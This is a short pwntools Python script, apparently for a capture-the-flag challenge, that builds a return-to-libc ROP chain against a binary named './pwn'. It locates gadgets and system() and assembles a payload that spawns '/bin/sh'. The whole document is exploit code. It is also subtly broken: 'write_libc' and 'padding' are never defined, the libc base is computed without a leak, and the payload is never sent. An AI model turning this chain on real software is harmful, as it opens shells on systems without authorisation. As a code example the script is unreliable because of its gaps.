from pwn import *
import sys
libc = ELF("./glibc/libc.so.6")
exe = ELF("./pwn")
rop = ROP(exe)

pop_rsi = rop.find_gadget(["pop rsi"])[0]
pop_rdi = rop.find_gadget(["pop rdi"])[0]
ret = rop.find_gadget(["ret"])[0]
main_function = exe.symbols.main
libc_base = write_libc-libc.symbols.write

write_plt = exe.plt.write
write_got = exe.got.write# Time to find GOT AND PLT
system = libc.symbols.system

binsh = next(libc.search(b"/bin/sh\x00"))
payload = flat([
padding,
p64(ret),
p64(pop_rdi),
p64(binsh),
p64(ret),

p64(system),
p64(ret)

])